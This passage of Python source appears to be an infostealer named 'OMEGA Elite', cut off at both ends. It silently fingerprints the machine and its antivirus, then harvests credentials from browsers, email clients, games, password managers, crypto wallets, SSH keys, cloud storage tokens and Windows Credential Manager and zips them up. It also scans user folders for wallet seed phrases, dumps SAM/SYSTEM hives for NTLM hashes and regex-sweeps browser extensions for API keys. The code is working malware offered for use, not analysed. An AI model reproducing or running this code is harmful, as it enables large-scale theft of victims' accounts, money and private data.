            "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /format:list",
            shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=8
        ).decode("utf-8", errors="ignore")
        av_names = [line.replace("displayName=","").strip() for line in av_out.splitlines() if "displayName=" in line]
        results.append({"type": "Installed AV", "products": av_names})

        # Disk serial numbers
        disk_out = subprocess.check_output(
            "wmic diskdrive get SerialNumber,Model /format:list",
            shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=8
        ).decode("utf-8", errors="ignore")
        results.append({"type": "Disk Info", "data": disk_out[:500]})

        # User folders
        results.append({
            "type":     "System Paths",
            "desktop":  os.path.join(HOME, "Desktop"),
            "documents": os.path.join(HOME, "Documents"),
            "downloads": os.path.join(HOME, "Downloads"),
        })

    except Exception as e:
        results.append({"type": "Fingerprint Error", "error": str(e)})
    return results


# ─────────────────────────────────────────────────────────────────────────────
# EMAIL CLIENTS
# ─────────────────────────────────────────────────────────────────────────────
def _get_email_clients() -> list:
    results = []

    # ── Thunderbird account credentials ──
    for name, path in GECKO_BROWSERS.items():
        if name != "Thunderbird" or not os.path.exists(path):
            continue
        for profile in os.listdir(path):
            pp = os.path.join(path, profile)
            for f in ["logins.json", "prefs.js", "key4.db"]:
                fp = os.path.join(pp, f)
                if os.path.exists(fp):
                    try:
                        content = open(fp, "r", encoding="utf-8", errors="ignore").read()
                        results.append({"type": f"Thunderbird/{f}", "data": content[:1500]})
                    except: pass

    # ── Mailbird ──
    mb = os.path.join(LOCALAPPDATA, "Mailbird", "Store", "Accounts.db")
    if os.path.exists(mb):
        try:
            conn = sqlite3.connect(mb)
            for row in conn.execute("SELECT * FROM Accounts LIMIT 50").fetchall():
                results.append({"type": "Mailbird Account", "data": str(row)[:400]})
            conn.close()
        except: pass

    # ── eM Client ──
    em = os.path.join(LOCALAPPDATA, "eM Client")
    if os.path.exists(em):
        for f in glob.glob(os.path.join(em, "**", "*.db"), recursive=True)[:3]:
            try:
                results.append({"type": "eM Client DB", "file": os.path.basename(f),
                                 "data_b64": base64.b64encode(open(f,"rb").read(256)).decode()})
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# UPDATED MAIN HARVEST — v23
# ─────────────────────────────────────────────────────────────────────────────
def run_omega_harvest_v23(log_func=None) -> bytes:
    """Run full deep extraction — v23. Returns ZIP bytes."""
    import zipfile, io

    def log(m):
        if log_func: log_func(m)

    all_data = {
        "passwords":        [],
        "cookies":          [],
        "tokens":           [],
        "crypto":           [],
        "games":            [],
        "apps":             [],
        "wifi":             [],
        "stream_keys":      [],
        "streaming_cookies": [],
        "password_managers": [],
        "ssh_keys":         [],
        "credit_cards":     [],
        "messaging":        [],
        "dev_creds":        [],
        "system":           [],
        "email":            [],
        "cred_manager":     [],
        "misc":             [],
    }

    log("[HARVEST] Browser credentials…")
    for name, path in CHROMIUM_BROWSERS.items():
        if not os.path.exists(path): continue
        log(f"[HARVEST] → {name}")
        all_data["passwords"].extend(_chromium_passwords(name, path))
        all_data["cookies"].extend(_chromium_cookies(name, path))
        all_data["crypto"].extend(_get_crypto_extensions(path))

    for name, path in GECKO_BROWSERS.items():
        if not os.path.exists(path): continue
        all_data["passwords"].extend(_gecko_passwords(name, path))

    log("[HARVEST] Credit cards & autofill…")
    all_data["credit_cards"].extend(_get_credit_cards())

    log("[HARVEST] Discord tokens…")
    all_data["tokens"].extend(_get_discord_tokens())

    log("[HARVEST] OBS stream keys (Twitch / Kick / YouTube)…")
    all_data["stream_keys"].extend(_get_obs_stream_keys())

    log("[HARVEST] Streamlabs stream keys…")
    all_data["stream_keys"].extend(_get_streamlabs_data())

    log("[HARVEST] XSplit stream keys…")
    all_data["stream_keys"].extend(_get_xsplit_data())

    log("[HARVEST] Restream / YellowDuck…")
    all_data["stream_keys"].extend(_get_restream_data())

    log("[HARVEST] Streaming platform cookies (Twitch/Kick/YT/TikTok)…")
    all_data["streaming_cookies"].extend(_get_streaming_cookies())

    log("[HARVEST] Game credentials…")
    all_data["games"].extend(_get_steam_data())
    all_data["games"].extend(_get_epic_data())
    all_data["games"].extend(_get_battlenet_data())
    all_data["games"].extend(_get_origin_ea_data())
    all_data["games"].extend(_get_ubisoft_data())
    all_data["games"].extend(_get_riot_data())
    all_data["games"].extend(_get_minecraft_data())
    all_data["games"].extend(_get_rockstar_data())
    all_data["games"].extend(_get_gog_data())
    all_data["games"].extend(_get_gaming_extras())

    log("[HARVEST] Crypto wallets…")
    all_data["crypto"].extend(_get_wallet_files())

    log("[HARVEST] Password managers (1Pass / Bitwarden / KeePass / LastPass)…")
    all_data["password_managers"].extend(_get_password_managers())

    log("[HARVEST] SSH keys…")
    all_data["ssh_keys"].extend(_get_ssh_keys())

    log("[HARVEST] Messaging apps (Telegram / Signal / WhatsApp / Slack)…")
    all_data["messaging"].extend(_get_telegram())
    all_data["messaging"].extend(_get_messaging_apps())

    log("[HARVEST] Email clients (Thunderbird / Mailbird / eM Client)…")
    all_data["email"].extend(_get_email_clients())

    log("[HARVEST] Developer credentials (Git / AWS / Docker / .env)…")
    all_data["dev_creds"].extend(_get_dev_credentials())

    log("[HARVEST] Applications (FileZilla / WinSCP / PuTTY / AnyDesk / TeamViewer)…")
    all_data["apps"].extend(_get_filezilla())
    all_data["apps"].extend(_get_winscp())
    all_data["apps"].extend(_get_putty())
    all_data["apps"].extend(_get_mremoteng())
    all_data["apps"].extend(_get_teamviewer())
    all_data["apps"].extend(_get_anydesk_data())
    all_data["apps"].extend(_get_outlook_data())
    all_data["apps"].extend(_get_vpn_data())

    log("[HARVEST] Windows Credential Manager…")
    all_data["cred_manager"].extend(_get_credential_manager())

    log("[HARVEST] WiFi passwords…")
    all_data["wifi"].extend(_get_wifi_passwords())

    log("[HARVEST] System fingerprint…")
    all_data["system"].extend(_get_system_fingerprint())

    log("[HARVEST] Packing archive…")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for category, items in all_data.items():
            if items:
                zf.writestr(f"{category}.json", json.dumps(items, indent=2, ensure_ascii=False))

        total = sum(len(v) for v in all_data.values())
        summary = {
            "version":           "OMEGA Elite v23",
            "total_records":     total,
            "passwords":         len(all_data["passwords"]),
            "cookies":           len(all_data["cookies"]),
            "credit_cards":      len(all_data["credit_cards"]),
            "tokens":            len(all_data["tokens"]),
            "stream_keys":       len(all_data["stream_keys"]),
            "streaming_cookies": len(all_data["streaming_cookies"]),
            "crypto_hits":       len(all_data["crypto"]),
            "game_hits":         len(all_data["games"]),
            "password_managers": len(all_data["password_managers"]),
            "ssh_keys":          len(all_data["ssh_keys"]),
            "messaging":         len(all_data["messaging"]),
            "dev_creds":         len(all_data["dev_creds"]),
            "app_hits":          len(all_data["apps"]),
            "cred_manager":      len(all_data["cred_manager"]),
            "wifi_networks":     len(all_data["wifi"]),
        }
        zf.writestr("SUMMARY.json", json.dumps(summary, indent=2))

    log(f"[HARVEST] ✓ Complete — {sum(len(v) for v in all_data.values())} total records extracted")
    return buf.getvalue()


# ═════════════════════════════════════════════════════════════════════════════
# ██████████████████████  v24 ADVANCED MODULE  ████████████████████████████████
# ═════════════════════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────────────────────────────────────
# SEED PHRASE SCANNER — Desktop / Documents / Downloads
# Matches standard BIP-39 word sequences (12 / 18 / 24 words)
# ─────────────────────────────────────────────────────────────────────────────
_BIP39_SAMPLE = {
    "abandon","ability","able","about","above","absent","absorb","abstract",
    "absurd","abuse","access","accident","account","accuse","achieve","acid",
    "acoustic","acquire","across","act","action","actor","actress","actual",
    "adapt","add","addict","address","adjust","admit","adult","advance",
    "advice","aerobic","afford","afraid","again","age","agent","agree",
    "ahead","aim","air","airport","aisle","alarm","album","alcohol","alert",
    "alien","all","alley","allow","almost","alone","alpha","already","also",
    "alter","always","amateur","amazing","among","amount","amused","analyst",
    "anchor","ancient","anger","angle","angry","animal","ankle","announce",
    "annual","another","answer","antenna","antique","anxiety","any","apart",
    "apology","appear","apple","approve","april","arch","arctic","area",
    "arena","argue","arm","armor","army","around","arrange","arrest","arrive",
    "arrow","art","artefact","artist","artwork","ask","aspect","assault",
    "asset","assist","assume","asthma","athlete","atom","attack","attend",
    "attitude","attract","auction","audit","august","aunt","author","auto",
    "autumn","average","avocado","avoid","awake","aware","away","awesome",
    "awful","awkward","axis","baby","balance","bamboo","banana","banner",
    "barely","bargain","barrel","base","basic","basket","battle","beach",
    "beauty","because","become","beef","before","begin","behave","behind",
    "believe","below","belt","bench","benefit","best","betray","better",
    "between","beyond","bicycle","bid","bike","bind","biology","bird",
    "birth","bitter","black","blade","blame","blanket","blast","bleak",
    "bless","blind","blood","blossom","blouse","blue","blur","blush","board",
    "boat","body","boil","bomb","bone","bonus","book","boost","border",
    "boring","borrow","boss","bottom","bounce","box","boy","bracket","brain",
    "brand","brave","breeze","brick","bridge","brief","bright","bring",
    "brisk","broccoli","broken","bronze","broom","brother","brown","brush",
    "bubble","buddy","budget","buffalo","build","bulb","bulk","bullet",
    "bundle","bunker","burden","burger","burst","bus","business","busy",
    "butter","buyer","buzz","cabbage","cabin","cable","cactus","cage",
    "cake","call","calm","camera","camp","can","canal","cancel","candy",
    "cannon","canvas","canyon","capable","capital","captain","car","carbon",
    "card","cargo","carpet","carry","cart","case","cash","casino","castle",
    "casual","cat","catalog","catch","category","cattle","caught","cause",
    "caution","cave","ceiling","celery","cement","census","century","cereal",
    "certain","chair","chalk","champion","change","chaos","chapter","charge",
    "chase","chat","cheap","check","cheese","chef","cherry","chest","chicken",
    "chief","child","chimney","choice","choose","chronic","chuckle","chunk",
    "cigar","cinnamon","circle","citizen","city","civil","claim","clap",
    "clarify","claw","clay","clean","clerk","clever","click","client","cliff",
    "climb","clinic","clip","clock","clog","close","cloth","cloud","clown",
    "club","clump","cluster","clutch","coach","coast","coconut","code",
    "coffee","coil","coin","collect","color","column","combine","come",
    "comfort","comic","common","company","concert","conduct","confirm",
    "congress","connect","consider","control","convince","cook","cool",
    "copper","copy","coral","core","corn","correct","cost","cotton","couch",
    "country","couple","course","cousin","cover","coyote","crack","cradle",
    "craft","cram","crane","crash","crater","crawl","crazy","cream","credit",
    "creek","crew","cricket","crime","crisp","critic","cross","crouch",
    "crowd","crucial","cruel","cruise","crumble","crunch","crush","cry",
    "crystal","cube","culture","cup","cupboard","curious","current","curtain",
    "curve","cushion","custom","cute","cycle","dad","damage","damp","dance",
    "danger","daring","dash","daughter","dawn","day","deal","debate","debris",
    "decade","december","decide","decline","decorate","decrease","deer",
    "defense","define","delay","deliver","demand","demise","denial","dentist",
    "deny","depart","depend","deposit","depth","deputy","derive","describe",
    "desert","design","desk","despair","destroy","detail","detect","develop",
    "device","devote","diagram","dial","diamond","diary","dice","diesel",
    "diet","differ","digital","dignity","dilemma","dinner","dinosaur","direct",
    "dirt","disagree","discover","disease","dish","dismiss","disorder",
    "display","distance","divert","divide","divorce","dizzy","doctor",
    "document","dog","doll","dolphin","domain","donate","donkey","donor",
    "door","dose","double","dove","draft","dragon","drama","drastic","draw",
    "dream","dress","drift","drill","drink","drip","drive","drop","drum",
    "dry","duck","dumb","dune","during","dust","dutch","duty","dwarf",
    "dynamic","eager","eagle","early","earn","earth","easily","east","easy",
    "echo","ecology","edge","edit","educate","effort","egg","eight","either",
    "elbow","elder","electric","elegant","element","elephant","elevator",
    "elite","else","embark","embody","embrace","emerge","emotion","employ",
    "empower","empty","enable","enact","endless","endorse","enemy","energy",
    "enforce","engage","engine","enhance","enjoy","enlist","enough","enrich",
    "enroll","ensure","enter","entire","entry","envelope","episode","equal",
    "equip","erase","erode","erosion","error","erupt","escape","essay",
    "essence","estate","eternal","ethics","evidence","evil","evoke","evolve",
    "exact","example","excess","exchange","excite","exclude","exercise",
    "exhaust","exhibit","exile","exist","exodus","expand","expire","explain",
    "expose","express","extend","extra","eye","fable","face","faculty",
    "faint","faith","fall","false","fame","family","famous","fan","fancy",
    "fantasy","far","fashion","fat","fatal","father","fatigue","fault",
    "favorite","feature","february","federal","fee","feed","feel","feet",
    "fellow","felt","fence","festival","fetch","fever","few","fiber",
    "fiction","field","figure","file","film","filter","final","find","fine",
    "finger","finish","fire","firm","first","fiscal","fish","fit","fitness",
    "fix","flag","flame","flash","flat","flavor","flee","flight","flip",
    "float","flock","floor","flower","fluid","flush","fly","foam","focus",
    "fog","foil","follow","food","foot","force","forest","forget","fork",
    "fortune","forum","forward","fossil","foster","found","fox","fragile",
    "frame","frequent","fresh","friend","fringe","frog","front","frost",
    "frown","frozen","fruit","fuel","fun","funny","furnace","fury","future",
    "gadget","gain","galaxy","gallery","game","gap","garbage","garden",
    "garlic","garment","gas","gasp","gate","gather","gauge","gaze","general",
    "genius","genre","gentle","genuine","gesture","ghost","giant","gift",
    "giggle","ginger","giraffe","girl","give","glad","glance","glare",
    "glass","glide","glimpse","globe","gloom","glory","glove","glow","glue",
    "goat","goddess","gold","good","goose","gorilla","gospel","gossip",
    "govern","gown","grab","grace","grain","grant","grape","grasp","grass",
    "gravity","great","green","grid","grief","grim","grip","grit","grocery",
    "group","grow","grunt","guard","guide","guilt","guitar","gun","gym",
    "habit","hair","half","hammer","hamster","hand","happy","harsh","harvest",
    "hat","have","hawk","hazard","head","health","heart","heavy","hedgehog",
    "height","hello","helmet","help","hen","hero","hidden","high","hill",
    "hint","hip","hire","history","hobby","hockey","hold","hole","holiday",
    "hollow","home","honey","hood","hope","horn","hospital","host","hour",
    "hover","hub","huge","human","humble","humor","hundred","hungry","hunt",
    "hurdle","hurry","hurt","husband","hybrid","ice","icon","ignore","ill",
    "illegal","image","imitate","immense","immune","impact","impose","improve",
    "impulse","inbox","income","increase","index","indicate","indoor",
    "industry","infant","inflict","inform","inhale","inject","inner","innocent",
    "input","inquiry","insane","insect","inside","inspire","install","intact",
    "interest","into","invest","invite","involve","iron","island","isolate",
    "issue","item","ivory","jacket","jaguar","jar","jazz","jealous","jeans",
    "jelly","jewel","join","journey","joy","judge","juice","jump","jungle",
    "junior","junk","just","kangaroo","keen","keep","ketchup","key","kick",
    "kidney","kind","kingdom","kiss","kit","kitchen","kite","kitten","kiwi",
    "knee","knife","knock","know","lab","lamp","language","laptop","large",
    "later","laugh","laundry","lava","law","lawn","lawsuit","layer","lazy",
    "leader","learn","leave","lecture","left","leg","legal","legend","lemon",
    "lend","length","lens","leopard","lesson","letter","level","liar","liberty",
    "library","license","life","lift","like","limb","limit","link","lion",
    "liquid","list","little","live","lizard","load","loan","lobster","local",
    "lock","logic","lonely","long","loop","lottery","loud","lounge","love",
    "loyal","lucky","luggage","lumber","lunar","lunch","luxury","mad","magic",
    "magnet","maid","main","major","make","mammal","mango","mansion","manual",
    "maple","marble","march","margin","marine","market","marriage","mask",
    "master","match","material","math","matrix","matter","maximum","maze",
    "meadow","mean","medal","media","melody","melt","member","memory","mention",
    "menu","mercy","merge","merit","merry","mesh","message","metal","method",
    "middle","midnight","milk","million","mimic","mind","minimum","minor",
    "minute","miracle","miss","mitten","model","modify","mom","monitor","month",
    "moral","more","morning","mosquito","mother","motion","motor","mountain",
    "movie","much","muffin","mule","multiply","muscle","museum","mushroom",
    "music","must","mutual","myself","mystery","naive","name","napkin",
    "narrow","nasty","nature","near","neck","need","negative","neglect",
    "neither","nephew","nerve","nest","network","news","next","nice","night",
    "noble","noise","nominee","noodle","normal","north","notable","note",
    "nothing","notice","novel","now","nuclear","number","nurse","nut","oak",
    "obey","object","oblige","obscure","obtain","ocean","october","odor",
    "offer","often","oil","okay","old","olive","olympic","omit","once",
    "onion","open","option","orange","orbit","orchard","order","ordinary",
    "organ","orient","original","orphan","ostrich","other","outdoor","outside",
    "oval","over","own","oyster","ozone","pact","paddle","page","pair",
    "palace","palm","panda","panel","panic","panther","paper","parade",
    "parent","park","parrot","party","pass","patch","path","patrol","pause",
    "pave","payment","peace","peanut","pear","peasant","pelican","pen",
    "penalty","pencil","people","pepper","perfect","permit","person","pet",
    "phone","photo","phrase","physical","piano","picnic","picture","piece",
    "pig","pigeon","pill","pilot","pink","pioneer","pipe","pistol","pitch",
    "pizza","place","planet","plastic","plate","play","please","pledge",
    "pluck","plug","plunge","poem","poet","point","polar","pole","police",
    "pond","pony","pool","popular","portion","position","possible","post",
    "potato","pottery","poverty","powder","power","practice","praise","predict",
    "prefer","prepare","present","pretty","prevent","price","pride","primary",
    "print","priority","prison","private","prize","problem","process","produce",
    "profit","program","project","promote","proof","property","prosper",
    "protect","proud","provide","public","pudding","pull","pulp","pulse",
    "pumpkin","punish","pupil","purchase","purity","purpose","push","put",
    "puzzle","pyramid","quality","quantum","quarter","question","quick","quit",
    "quiz","quote","rabbit","raccoon","race","rack","radar","radio","rage",
    "rail","rain","raise","rally","ramp","ranch","random","range","rapid",
    "rare","rate","rather","raven","reach","ready","real","reason","rebel",
    "rebuild","recall","receive","recipe","record","recycle","reduce","reflect",
    "reform","refuse","region","regret","regular","reject","relax","release",
    "relief","rely","remain","remember","remind","remove","render","renew",
    "rent","reopen","repair","repeat","replace","report","require","rescue",
    "resemble","resist","resource","response","result","retire","retreat",
    "return","reunion","reveal","review","reward","rhythm","ribbon","rice",
    "rich","ride","ridge","rifle","right","rigid","ring","riot","ripple",
    "risk","ritual","rival","river","road","roast","robot","robust","rocket",
    "romance","roof","rookie","room","rose","rotate","rough","round","route",
    "royal","rubber","rude","rug","rule","run","runway","rural","sad","saddle",
    "sadness","safe","sail","salad","salmon","salon","salt","salute","same",
    "sample","sand","satisfy","satoshi","sauce","sausage","save","say","scale",
    "scan","scare","scatter","scene","scheme","school","science","scissors",
    "scorpion","scout","scrap","screen","script","scrub","sea","search",
    "season","seat","second","secret","section","security","seed","seek",
    "segment","select","sell","seminar","senior","sense","sentence","series",
    "service","session","settle","setup","seven","shadow","shaft","shallow",
    "share","shed","shell","sheriff","shield","shift","shine","ship","shiver",
    "shock","shoe","shoot","shop","short","shoulder","shove","shrimp","shrug",
    "shuffle","shy","sibling","siege","sight","sign","silent","silk","silly",
    "silver","similar","simple","since","sing","siren","sister","situate",
    "six","size","ski","skill","skin","skirt","skull","slab","slam","sleep",
    "slender","slice","slide","slight","slim","slogan","slot","slow","slush",
    "small","smart","smile","smoke","smooth","snack","snake","snap","sniff",
    "snow","soap","soccer","social","sock","solar","soldier","solid","solution",
    "solve","someone","song","soon","sorry","soul","sound","soup","source",
    "south","space","spare","spatial","spawn","speak","special","speed",
    "sphere","spice","spider","spike","spin","spirit","split","spoil","sponsor",
    "spoon","spray","spread","spring","spy","square","squeeze","squirrel",
    "stable","stadium","staff","stage","stairs","stamp","stand","start",
    "state","stay","steak","steel","stem","step","stereo","stick","still",
    "sting","stock","stomach","stone","stop","store","storm","strategy",
    "street","strike","strong","struggle","student","stuff","stumble","style",
    "subject","submit","subway","success","such","sudden","suffer","sugar",
    "suggest","suit","summer","super","supply","supreme","sure","surface",
    "surge","surprise","sustain","swallow","swamp","swap","swear","sweet",
    "swift","swim","swing","switch","sword","symbol","symptom","syrup","table",
    "tackle","tag","tail","talent","tank","tape","target","task","tattoo",
    "taxi","teach","team","tell","ten","tenant","tennis","tent","term","test",
    "text","thank","that","theme","then","theory","there","they","thing",
    "this","thought","three","thrive","throw","thumb","thunder","ticket",
    "tilt","timber","time","tiny","tip","tired","title","toast","tobacco",
    "today","together","toilet","token","tomato","tomorrow","tone","tongue",
    "tonight","tool","tooth","top","topic","topple","torch","tornado","tortoise",
    "total","tourist","toward","tower","town","toy","track","trade","traffic",
    "tragic","train","transfer","trap","trash","travel","tray","treat","tree",
    "trend","trial","tribe","trick","trigger","trim","trip","trophy","trouble",
    "truck","truly","trumpet","trust","truth","try","tube","tuition","tumble",
    "tuna","tunnel","turkey","turn","turtle","twelve","twenty","twice","twin",
    "twist","two","type","typical","ugly","umbrella","unable","unaware",
    "uncle","uncover","under","undo","unfair","unfold","unhappy","uniform",
    "unique","universe","unknown","unlock","until","unusual","unwrap","update",
    "upgrade","uphold","upon","upper","upset","urban","useful","useless",
    "usual","utility","vacant","vacuum","vague","valid","valley","valve",
    "van","vanish","vapor","various","vast","vault","vehicle","velvet",
    "vendor","venture","venue","verb","verify","version","very","veteran",
    "viable","vibrant","vicious","victory","video","view","village","vintage",
    "violin","virtual","virus","visa","visit","visual","vital","vivid",
    "vocal","voice","void","volcano","volume","vote","voyage","wage","wagon",
    "wait","walk","wall","walnut","want","warfare","warm","warrior","waste",
    "water","wave","way","wealth","weapon","wear","weasel","weather","web",
    "wedding","weekend","weird","welcome","well","west","wet","whale","wheat",
    "wheel","when","where","whip","whisper","wide","width","wife","wild",
    "will","win","window","wine","wing","wink","winner","winter","wire",
    "wisdom","wise","wish","witness","wolf","woman","wonder","wood","wool",
    "word","world","worry","worth","wrap","wreck","wrestle","wrist","write",
    "wrong","yard","year","yellow","you","young","youth","zebra","zero",
    "zone","zoo"
}

def _scan_seed_phrases() -> list:
    """Scan common locations for BIP-39 mnemonic seed phrases (12/18/24 words)."""
    import re
    results = []
    WORD_RE = re.compile(r'\b(' + '|'.join(_BIP39_SAMPLE) + r')\b', re.I)
    SCAN_DIRS = [
        os.path.join(HOME, "Desktop"),
        os.path.join(HOME, "Documents"),
        os.path.join(HOME, "Downloads"),
        os.path.join(HOME, "Pictures"),
        os.path.join(HOME, "OneDrive"),
        HOME,
    ]
    SCAN_EXTS = {".txt", ".md", ".json", ".csv", ".rtf", ".docx", ".log",
                 ".bak", ".old", ".key", ".seed", ".wallet", ".secret"}
    FILENAME_HITS = {"seed","mnemonic","recovery","backup","phrase","wallet",
                     "secret","private","bitcoin","crypto","btc","eth","key"}
    seen = set()

    for d in SCAN_DIRS:
        if not os.path.exists(d):
            continue
        for root, dirs, files in os.walk(d):
            # skip massive dirs
            dirs[:] = [x for x in dirs if x.lower() not in
                       {"windows","appdata","node_modules","__pycache__",".git","vendor"}]
            for fname in files:
                fpath = os.path.join(root, fname)
                if fpath in seen:
                    continue
                seen.add(fpath)
                ext = os.path.splitext(fname)[1].lower()
                name_lower = fname.lower()
                fname_match = any(h in name_lower for h in FILENAME_HITS)

                if ext not in SCAN_EXTS and not fname_match:
                    continue
                try:
                    sz = os.path.getsize(fpath)
                    if sz == 0 or sz > 2 * 1024 * 1024:
                        continue
                    text = open(fpath, "r", encoding="utf-8", errors="ignore").read()
                    words = WORD_RE.findall(text.lower())
                    # A seed phrase has 12, 18, or 24 consecutive BIP-39 words
                    # Find lines with >=8 unique BIP-39 words
                    found_seed = False
                    for line in text.splitlines():
                        lw = WORD_RE.findall(line.lower())
                        if len(lw) >= 8 and len(set(lw)) >= 8:
                            results.append({
                                "type":    "Seed Phrase Hit",
                                "file":    fpath,
                                "line":    line.strip()[:200],
                                "words":   len(lw),
                                "snippet": text[:300],
                            })
                            found_seed = True
                            break
                    if not found_seed and fname_match and len(words) >= 4:
                        results.append({
                            "type":    "Seed File (suspicious name)",
                            "file":    fpath,
                            "words":   len(words),
                            "data":    text[:500],
                        })
                except:
                    pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# WINDOWS SAM / NTLM HASH EXTRACTION (Volume Shadow Copy bypass)
# ─────────────────────────────────────────────────────────────────────────────
def _dump_ntlm_hashes() -> list:
    """Dump SAM / SYSTEM hives via VSS shadow copy, then extract NTLM hashes."""
    import subprocess, tempfile
    results = []
    tmp = tempfile.mkdtemp()
    try:
        # 1. Find latest VSS shadow
        vss_out = subprocess.check_output(
            "vssadmin list shadows /for=C:",
            shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=15
        ).decode("utf-8", errors="ignore")
        import re
        shadows = re.findall(r"Shadow Copy Volume Name:\s*(\\\\.*?)[\r\n]", vss_out)
        if not shadows:
            results.append({"type": "NTLM Error", "error": "No VSS shadows found"})
            return results

        shadow = shadows[-1].strip()

        # 2. Copy SAM + SYSTEM + SECURITY from shadow
        sam_src    = shadow + r"\Windows\System32\config\SAM"
        system_src = shadow + r"\Windows\System32\config\SYSTEM"
        sec_src    = shadow + r"\Windows\System32\config\SECURITY"
        sam_dst    = os.path.join(tmp, "SAM")
        system_dst = os.path.join(tmp, "SYSTEM")
        sec_dst    = os.path.join(tmp, "SECURITY")

        for src, dst in [(sam_src, sam_dst), (system_src, system_dst), (sec_src, sec_dst)]:
            subprocess.run(f'cmd /c copy /y "{src}" "{dst}"',
                           shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)

        # 3. Read raw hive bytes for exfil (impacket-style offline crack)
        for fname, path in [("SAM", sam_dst), ("SYSTEM", system_dst), ("SECURITY", sec_dst)]:
            if os.path.exists(path):
                size = os.path.getsize(path)
                header = base64.b64encode(open(path, "rb").read(4096)).decode()
                results.append({
                    "type":    "NTLM Hive",
                    "hive":    fname,
                    "size_kb": size // 1024,
                    "header_b64": header,
                    "note":    "Use secretsdump.py offline to extract NTLM hashes",
                })

        # 4. Quick reg save fallback (no admin needed on some systems)
        for hive, reg_path, out_name in [
            ("SAM",      "HKLM\\SAM",      "sam_reg.hiv"),
            ("SECURITY", "HKLM\\SECURITY", "sec_reg.hiv"),
            ("SYSTEM",   "HKLM\\SYSTEM",   "sys_reg.hiv"),
        ]:
            out = os.path.join(tmp, out_name)
            r = subprocess.run(
                f'reg save {reg_path} "{out}" /y',
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
                capture_output=True, timeout=10
            )
            if os.path.exists(out):
                results.append({
                    "type":    "Reg Save Hive",
                    "hive":    hive,
                    "size_kb": os.path.getsize(out) // 1024,
                    "data_b64": base64.b64encode(open(out, "rb").read(2048)).decode(),
                })

    except Exception as e:
        results.append({"type": "NTLM Error", "error": str(e)})
    finally:
        import shutil as _shutil
        _shutil.rmtree(tmp, ignore_errors=True)
    return results


# ─────────────────────────────────────────────────────────────────────────────
# CLOUD STORAGE OAUTH — Google Drive / Dropbox / OneDrive / Box / Mega
# ─────────────────────────────────────────────────────────────────────────────
def _get_cloud_storage_tokens() -> list:
    results = []

    # ── Google Drive / Drive for Desktop ──
    google_paths = [
        os.path.join(APPDATA, "Google", "Drive"),
        os.path.join(LOCALAPPDATA, "Google", "DriveFS"),
        os.path.join(APPDATA, "Google", "Drive File Stream"),
    ]
    for gp in google_paths:
        for ext in ["*.json", "*.db", "*.dat"]:
            for f in glob.glob(os.path.join(gp, "**", ext), recursive=True):
                try:
                    content = open(f, "r", encoding="utf-8", errors="ignore").read()
                    if any(k in content.lower() for k in ["token", "auth", "refresh", "access"]):
                        results.append({"type": "Google Drive Token", "file": os.path.basename(f),
                                        "data": content[:800]})
                except: pass

    # ── Dropbox ──
    db_info = os.path.join(APPDATA, "Dropbox", "info.json")
    if os.path.exists(db_info):
        results.append({"type": "Dropbox Info", "data": open(db_info, encoding="utf-8", errors="ignore").read()})
    for dp in [os.path.join(APPDATA, "Dropbox"), os.path.join(LOCALAPPDATA, "Dropbox")]:
        for f in glob.glob(os.path.join(dp, "**", "*.json"), recursive=True):
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                if "token" in content.lower() or "account_id" in content.lower():
                    results.append({"type": "Dropbox Token", "file": os.path.basename(f), "data": content[:700]})
            except: pass

    # ── OneDrive ──
    od_paths = [
        os.path.join(LOCALAPPDATA, "Microsoft", "OneDrive"),
        os.path.join(APPDATA, "Microsoft", "OneDrive"),
    ]
    for odp in od_paths:
        for f in glob.glob(os.path.join(odp, "**", "*.json"), recursive=True) + \
                 glob.glob(os.path.join(odp, "**", "*.dat"), recursive=True):
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                if any(k in content.lower() for k in ["token", "access", "refresh", "account"]):
                    results.append({"type": "OneDrive Token", "file": os.path.basename(f), "data": content[:700]})
            except: pass

    # ── Box ──
    box_cfg = os.path.join(HOME, ".box", "config.json")
    if os.path.exists(box_cfg):
        results.append({"type": "Box Config", "data": open(box_cfg, encoding="utf-8", errors="ignore").read()})

    # ── MEGA / MEGAsync ──
    mega = os.path.join(APPDATA, "Mega Limited", "MEGAsync")
    if os.path.exists(mega):
        for f in glob.glob(os.path.join(mega, "**", "*.dat"), recursive=True) + \
                 glob.glob(os.path.join(mega, "**", "*.json"), recursive=True):
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                results.append({"type": "MEGA Data", "file": os.path.basename(f), "data": content[:600]})
            except: pass

    # ── pCloud ──
    pcloud = os.path.join(LOCALAPPDATA, "pCloud")
    if os.path.exists(pcloud):
        for f in glob.glob(os.path.join(pcloud, "**", "*.db"), recursive=True)[:3]:
            try:
                results.append({"type": "pCloud DB", "file": os.path.basename(f),
                                 "data_b64": base64.b64encode(open(f,"rb").read(512)).decode()})
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# BROWSER EXTENSION SWEEP — all installed extensions credential data
# ─────────────────────────────────────────────────────────────────────────────
def _sweep_browser_extensions() -> list:
    """Scan ALL installed browser extensions for stored credentials / tokens."""
    import re
    results = []
    TOKEN_PATTERNS = [
        re.compile(r'(?:api[_\-]?key|token|secret|password|auth|access[_\-]?token|bearer)["\s:=]+([A-Za-z0-9\-_\.]{20,})', re.I),
        re.compile(r'(sk-[A-Za-z0-9]{48})'),                   # OpenAI
        re.compile(r'(AIza[0-9A-Za-z\-_]{35})'),               # Google API
        re.compile(r'(ghp_[A-Za-z0-9]{36})'),                  # GitHub PAT
        re.compile(r'(xox[bpas]-[\w-]+)'),                     # Slack
        re.compile(r'(mfa\.[A-Za-z0-9_-]{84})'),               # Discord MFA
        re.compile(r'([A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27})'),  # Discord
        re.compile(r'(AKIA[0-9A-Z]{16})'),                     # AWS key
